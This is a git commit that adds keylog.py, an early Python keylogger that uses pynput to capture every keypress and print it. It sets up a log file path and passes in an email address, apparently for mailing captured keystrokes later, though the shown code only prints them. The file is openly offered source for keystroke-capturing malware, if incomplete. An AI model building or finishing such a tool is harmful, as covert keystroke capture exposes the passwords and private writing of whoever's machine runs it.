0c72f7c57b88589407e66a975e47f2cadee181af
李立桓 <lilihuan@lilihuandeMacBook-Air.local>
2021-03-02 13:22:40 +0800

    initialised keylogger

---
+++ keylog.py
@@ -0,0 +1,34 @@
+import os
+from pynput import keyboard
+
+
+# define the path of log file.
+path = os.getcwd()
+log_file = path + '/log'
+
+"""
+Class that processes some basic functions of a keylogger.
+Keyboard functions referenced from
+https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard.
+"""
+class Keylogger:
+    def __init__(self, email):
+        self.log_file = log_file
+        self.email = email
+
+    def get_key(self, key):
+        try:
+            getKey = str(key.char)
+            print(getKey)
+        except AttributeError:
+            pass
+
+    def start(self):
+        keyboard_listener = keyboard.Listener(on_press=self.get_key)
+        with keyboard_listener:
+            keyboard_listener.join()
+
+
+
+kl = Keylogger('295064001@qq.com')
+kl.start()
